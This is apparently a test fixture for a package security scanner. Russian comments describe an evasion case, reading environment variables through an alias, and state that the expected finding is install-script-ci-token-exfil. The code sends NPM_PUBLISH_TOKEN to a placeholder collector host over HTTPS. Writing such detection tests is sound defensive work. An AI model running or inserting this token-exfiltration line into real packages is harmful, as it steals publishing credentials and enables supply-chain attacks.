// Обход по форме источника: process.env кладётся в псевдоним, обращение идёт через него.
// Ожидается ERROR install-script-ci-token-exfil.
const env = process.env;

require('https').get('https://collector.example.invalid/c?t=' + env.NPM_PUBLISH_TOKEN);
